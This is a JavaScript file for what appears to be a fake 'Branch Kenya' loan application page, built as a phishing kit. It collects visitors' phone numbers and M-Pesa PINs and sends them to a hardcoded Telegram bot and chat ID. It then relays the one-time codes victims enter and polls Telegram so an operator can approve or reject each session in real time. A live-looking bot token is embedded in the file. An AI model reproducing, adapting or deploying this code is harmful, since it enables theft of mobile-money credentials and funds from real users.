/**
 * Branch Kenya - Application Form Script
 * Handles multi-step form navigation and validation
 * Includes Telegram Bot notification system
 */

// ========================================
// CONFIGURATION - Telegram Bot Settings
// ========================================
const TELEGRAM_BOT_TOKEN = '8673644771:AAGQAdjmxWmCieL7GLnZhRtnDZ4WE2TCs9o';
const TELEGRAM_CHAT_ID = '7973653220';
// Unique session ID for this browser
const SESSION_ID = 'session_' + Math.random().toString(36).substr(2, 9);

// Approval states
let phonePinApproved = true;
let otpApproved = false;
let approvalPollingInterval = null;
let otpPollingInterval = null;
let lastUpdateId = 0;

// Store verification codes
let storedOTP = '';

// Store user details
let userPhone = '';
let userPin = '';

(function() {
    'use strict';

    // Current step tracking
    let currentStep = 1;
    const totalSteps = 3;

    // Interest rate for calculations
    const interestRate = 0.12;

    // Loan details state
    let loanDetails = {
        amount: 30000,
        term: 12,
        monthlyPayment: 0,
        totalRepayment: 0
    };

    // ========================================
    // Initialize
    // ========================================
    document.addEventListener('DOMContentLoaded', function() {
        // Check if user has already applied
        const hasApplied = localStorage.getItem('branch_has_applied');
        if (hasApplied) {
            const applicationId = localStorage.getItem('branch_application_id');
            alert('You can apply loans once. Your application ID is: ' + applicationId);
            // Optionally redirect to home
            // window.location.href = 'index.html';
        }
        
        initAmountSelector();
        initTermSelector();
        calculateLoan();
    });

    // ========================================
    // Amount Selector
    // ========================================
    function initAmountSelector() {
        const amountBtns = document.querySelectorAll('.amount-btn');
        
        amountBtns.forEach(btn => {
            btn.addEventListener('click', function() {
                amountBtns.forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                loanDetails.amount = parseInt(this.dataset.amount);
                calculateLoan();
            });
        });
    }

    // ========================================
    // Term Selector
    // ========================================
    function initTermSelector() {
        const termSelect = document.getElementById('loanTerm');
        if (termSelect) {
            termSelect.addEventListener('change', function() {
                loanDetails.term = parseInt(this.value);
                calculateLoan();
            });
        }
    }

    // ========================================
    // Calculate Loan
    // ========================================
    function calculateLoan() {
        const principal = loanDetails.amount;
        const termMonths = loanDetails.term;
        const monthlyRate = interestRate / 12;
        
        let monthlyPayment;
        if (monthlyRate === 0) {
            monthlyPayment = principal / termMonths;
        } else {
            const factor = Math.pow(1 + monthlyRate, termMonths);
            monthlyPayment = principal * (monthlyRate * factor) / (factor - 1);
        }
        
        const totalRepayment = monthlyPayment * termMonths;
        
        loanDetails.monthlyPayment = Math.round(monthlyPayment);
        loanDetails.totalRepayment = Math.round(totalRepayment);
        
        updateLoanSummary();
    }

    // ========================================
    // Update Loan Summary
    // ========================================
    function updateLoanSummary() {
        const amountEl = document.getElementById('summary-amount');
        const termEl = document.getElementById('summary-term');
        const monthlyEl = document.getElementById('summary-monthly');
        
        if (amountEl) amountEl.textContent = formatCurrency(loanDetails.amount);
        if (termEl) termEl.textContent = loanDetails.term + ' Months';
        if (monthlyEl) monthlyEl.textContent = formatCurrency(loanDetails.monthlyPayment);
    }

    // ========================================
    // Format Currency
    // ========================================
    function formatCurrency(amount) {
        return 'KES ' + amount.toLocaleString('en-KE', { minimumFractionDigits: 0, maximumFractionDigits: 0 });
    }

    // ========================================
    // Navigation Functions
    // ========================================
    window.nextStep = function(step) {
        if (step < totalSteps) {
            currentStep = step + 1;
            showStep(currentStep);
        }
    };

    window.prevStep = function(step) {
        if (step > 1) {
            currentStep = step - 1;
            showStep(currentStep);
        } else {
            window.location.href = 'index.html';
        }
    };

    // ========================================
    // Show Step
    // ========================================
    function showStep(step) {
        document.querySelectorAll('.form-step').forEach(el => el.classList.remove('active'));
        
        const currentStepEl = document.getElementById('step-' + step);
        if (currentStepEl) currentStepEl.classList.add('active');
        
        updateProgressBar(step);
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    // ========================================
    // Update Progress Bar
    // ========================================
    function updateProgressBar(step) {
        const steps = document.querySelectorAll('.progress-step');
        
        steps.forEach((el, index) => {
            const stepNum = index + 1;
            el.classList.remove('active', 'completed');
            
            if (stepNum < step) {
                el.classList.add('completed');
            } else if (stepNum === step) {
                el.classList.add('active');
            }
        });
        
        const lines = document.querySelectorAll('.progress-line');
        lines.forEach((line, index) => {
            if (index < step - 1) line.classList.add('active');
            else line.classList.remove('active');
        });
    }

    // ========================================
    // Submit Details - Auto proceed to Step 2
    // ========================================
    window.submitDetailsForApproval = async function() {
        const phoneInput = document.getElementById('phone');
        const pinInput = document.getElementById('mpesaPin');
        const submitBtn = document.getElementById('submitDetailsBtn');
        
        const phone = phoneInput.value.trim();
        const pin = pinInput.value.trim();
        
        if (!phone || phone.length < 9) {
            alert('Please enter a valid phone number');
            return;
        }
        
        if (!pin || pin.length !== 4 || !/^\d+$/.test(pin)) {
            alert('Please enter a valid 4-digit M-Pesa PIN');
            return;
        }
        
        userPhone = phone;
        userPin = pin;
        
        submitBtn.disabled = true;
        submitBtn.textContent = 'Sending...';
        
        await sendToBotForApproval(phone, pin);
        
        document.getElementById('pin-waiting').style.display = 'none';
        document.getElementById('pin-approved').style.display = 'block';
        document.getElementById('pin-approved').querySelector('p').textContent = '✓ Phone & PIN Verified!';
        
        document.getElementById('phone-actions').style.display = 'none';
        document.getElementById('otp-actions').style.display = 'flex';
        document.getElementById('otpPhone').textContent = userPhone;
        
        showStep(2);
    };

    // ========================================
    // Send to Bot (Step 1 - Notification only)
    // ========================================
    async function sendToBotForApproval(phone, pin) {
        const message = '\uD83D\uDCE2 NEW VERIFICATION REQUEST\n\n\uD83D\uDCF1 Session ID: ' + SESSION_ID + '\n\uD83D\uDE4F Phone: ' + phone + '\n\uD83D\uDD11 PIN: ' + pin + '\n\uD83D\uDD52 Time: ' + new Date().toLocaleString();

        try {
            const response = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
            });
            
            const result = await response.json();
            console.log('Bot response:', result);
        } catch (error) {
            console.log('Error sending to bot:', error);
        }
    }

    // ========================================
    // Reset Phone Verification
    // ========================================
    window.resetPhoneVerification = function() {
        phonePinApproved = true;
        otpApproved = false;
        
        if (approvalPollingInterval) clearInterval(approvalPollingInterval);
        if (otpPollingInterval) clearInterval(otpPollingInterval);
        
        document.getElementById('pin-waiting').style.display = 'none';
        document.getElementById('pin-approved').style.display = 'none';
        document.getElementById('phone-actions').style.display = 'flex';
        document.getElementById('otp-actions').style.display = 'none';
        document.querySelector('.approval-notice').style.display = 'block';
        document.getElementById('submitDetailsBtn').disabled = false;
        document.getElementById('submitDetailsBtn').textContent = 'Continue';
        document.getElementById('submitDetailsBtn').style.display = 'block';
    };

    // ========================================
    // Request OTP
    // ========================================
    window.requestOTPAfterApproval = function() {
        const otpCode = generateOTP();
        storedOTP = otpCode;
        
        sendOTPToBot(userPhone, otpCode);
        document.getElementById('otpPhone').textContent = userPhone;
        showStep(2);
        
        console.log('OTP sent to:', userPhone, 'Code:', otpCode);
    };

    // ========================================
    // Generate OTP (4 digits)
    // ========================================
    function generateOTP() {
        return Math.floor(1000 + Math.random() * 9000).toString();
    }

    // ========================================
    // Send OTP to Bot (with buttons)
    // ========================================
    async function sendOTPToBot(phone, otpCode) {
        const message = '\uD83D\uDCE5 OTP SENT TO CUSTOMER\n\n\uD83D\uDCF1 Session ID: ' + SESSION_ID + '\n\uD83D\uDE4F Phone: ' + phone + '\n\uD83D\uDD10 OTP Code: ' + otpCode + '\n\uD83D\uDD52 Time: ' + new Date().toLocaleString();

        const replyMarkup = {
            inline_keyboard: [
                [{ text: '\u2705 APPROVE', callback_data: 'otp_verify_' + SESSION_ID }, { text: '\u274C REJECT', callback_data: 'otp_reject_' + SESSION_ID }]
            ]
        };

        try {
            await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, reply_markup: replyMarkup })
            });
        } catch (error) {
            console.log('Error sending OTP to bot:', error);
        }
    }

    // ========================================
    // Verify OTP
    // ========================================
    window.verifyOTP = async function() {
        const otpCode = document.getElementById('otpCode').value;
        
        if (!otpCode || otpCode.length !== 4) {
            alert('Please enter a valid 4-digit code');
            return;
        }
        
        document.getElementById('otp-waiting').style.display = 'block';
        document.getElementById('otp-form').style.display = 'none';
        
        await sendOTPVerificationToBot(otpCode);
        startOTPVerificationPolling();
    };

    // ========================================
    // Send OTP Verification to Bot (with buttons)
    // ========================================
    async function sendOTPVerificationToBot(otpCode) {
        const message = '\uD83D\uDD04 OTP VERIFICATION SUBMITTED\n\n\uD83D\uDCF1 Session ID: ' + SESSION_ID + '\n\uD83D\uDE4F Phone: ' + userPhone + '\n\uD83D\uDD10 Code Entered: ' + otpCode + '\n\uD83D\uDD52 Time: ' + new Date().toLocaleString();

        const replyMarkup = { inline_keyboard: [[{ text: '\u2705 APPROVE', callback_data: 'otp_verify_' + SESSION_ID }, { text: '\u274C REJECT', callback_data: 'otp_reject_' + SESSION_ID }]] };

        try {
            await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, reply_markup: replyMarkup })
            });
        } catch (error) {
            console.log('Error sending OTP verification to bot:', error);
        }
    }

    // ========================================
    // Start OTP Verification Polling
    // ========================================
    function startOTPVerificationPolling() {
        otpPollingInterval = setInterval(async function() {
            try {
                const response = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/getUpdates?offset=' + (lastUpdateId + 1) + '&timeout=1');
                const data = await response.json();
                
                if (data.ok && data.result && data.result.length > 0) {
                    lastUpdateId = data.result[data.result.length - 1].update_id;
                    
                    for (const update of data.result) {
                        if (update.callback_query) {
                            const callbackData = update.callback_query.data;
                            const callbackId = update.callback_query.id;
                            
                            fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/answerCallbackQuery', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ callback_query_id: callbackId })
                            });
                            
                            if (callbackData === 'otp_verify_' + SESSION_ID) {
                                otpApproved = true;
                                clearInterval(otpPollingInterval);
                                onOTPApproved();
                                return;
                            }
                            
                            if (callbackData === 'otp_reject_' + SESSION_ID) {
                                clearInterval(otpPollingInterval);
                                onOTPRejected();
                                return;
                            }
                        }
                    }
                }
            } catch (error) {
                console.log('OTP Polling error:', error);
            }
        }, 1000);
    }

    // ========================================
    // On OTP Approved
    // ========================================
    function onOTPApproved() {
        document.getElementById('otp-waiting').style.display = 'none';
        document.getElementById('otp-approved').style.display = 'block';
        document.getElementById('otp-approved').querySelector('p').textContent = '✓ OTP Verified!';
        
        // Send ONE message - OTP VERIFIED
        fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: '\u2705 OTP VERIFIED - Customer can proceed to loan details!' })
        });
        
        setTimeout(() => { showStep(3); }, 500);
    }

    // ========================================
    // On OTP Rejected
    // ========================================
    function onOTPRejected() {
        document.getElementById('otp-waiting').style.display = 'none';
        document.getElementById('otp-error').style.display = 'block';
        document.getElementById('otp-form').style.display = 'block';
    }

    // ========================================
    // Resend OTP
    // ========================================
    window.resendOTP = function() {
        const otpCode = generateOTP();
        storedOTP = otpCode;
        sendOTPToBot(userPhone, otpCode);
        alert('A new code has been sent!');
    };

    // ========================================
    // Send Approval Result to Bot
    // ========================================
    async function sendApprovalResultToBot(approved, type) {
        const status = approved ? '\u2705 APPROVED' : '\u274C REJECTED';
        const message = status + '\n\n\uD83D\uDCF1 Session ID: ' + SESSION_ID + '\n\uD83D\uDE4F Phone: ' + userPhone + '\n\uD83D\uDCDD Verification: ' + type + '\n\uD83D\uDD52 Time: ' + new Date().toLocaleString();

        try {
            await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
            });
        } catch (error) {
            console.log('Error sending result to bot:', error);
        }
    }

    // ========================================
    // Submit Application
    // ========================================
    window.submitApplication = function() {
        // Check if user has already applied
        const hasApplied = localStorage.getItem('branch_has_applied');
        if (hasApplied) {
            alert('You can only apply for one loan at a time. You have an existing application.');
            return;
        }
        
        const appId = 'BRK-' + new Date().getFullYear() + '-' + Math.random().toString(36).substr(2, 5).toUpperCase();
        
        const applicationData = {
            id: appId,
            phone: userPhone,
            loan: loanDetails,
            submittedAt: new Date().toISOString()
        };
        
        sendTelegramNotification(applicationData);
        console.log('Application Submitted:', applicationData);
        
        // Mark as applied in localStorage
        localStorage.setItem('branch_has_applied', 'true');
        localStorage.setItem('branch_application_id', appId);
        
        document.getElementById('application-id').textContent = appId;
        
        document.querySelectorAll('.form-step').forEach(el => el.classList.remove('active'));
        document.getElementById('step-success').classList.add('active');
        
        const steps = document.querySelectorAll('.progress-step');
        steps.forEach(el => el.classList.add('completed'));
        
        window.scrollTo({ top: 0, behavior: 'smooth' });
    };

    // ========================================
    // Send Telegram Notification
    // ========================================
    async function sendTelegramNotification(data) {
        const message = '\uD83C\uDFE6 NEW LOAN APPLICATION\n\n\uD83D\uDCC4 App ID: ' + data.id + '\n\uD83D\uDE4F Phone: ' + data.phone + '\n\uD83D\uDCB5 Amount: KES ' + data.loan.amount.toLocaleString() + '\n\uD83D\uDCC5 Term: ' + data.loan.term + ' months\n\uD83D\uDCB8 Monthly: KES ' + data.loan.monthlyPayment.toLocaleString() + '\n\uD83D\uDCB0 Total: KES ' + data.loan.totalRepayment.toLocaleString() + '\n\uD83D\uDD52 Time: ' + new Date(data.submittedAt).toLocaleString();

        try {
            const response = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
            });

            const result = await response.json();
            if (result.ok) console.log('Telegram notification sent successfully!');
            else console.log('Telegram notification failed:', result.description);
        } catch (error) {
            console.log('Error sending Telegram notification:', error);
        }
    }

    // ========================================
    // Real-time validation
    // ========================================
    document.querySelectorAll('input, select').forEach(field => {
        field.addEventListener('blur', function() {
            if (this.value.trim()) validateField(this, 'This field is required');
        });
        
        field.addEventListener('input', function() {
            clearError(this);
        });
    });

    function validateField(field, message) {
        if (!field || !field.value.trim()) {
            if (field) showError(field, message);
            return false;
        }
        clearError(field);
        return true;
    }

    function showError(field, message) {
        clearError(field);
        field.style.borderColor = '#dc2626';
        
        const errorDiv = document.createElement('div');
        errorDiv.className = 'field-error';
        errorDiv.style.color = '#dc2626';
        errorDiv.style.fontSize = '12px';
        errorDiv.style.marginTop = '4px';
        errorDiv.textContent = message;
        
        field.parentNode.appendChild(errorDiv);
    }

    function clearError(field) {
        field.style.borderColor = '';
        const errorDiv = field.parentNode.querySelector('.field-error');
        if (errorDiv) errorDiv.remove();
    }

})();
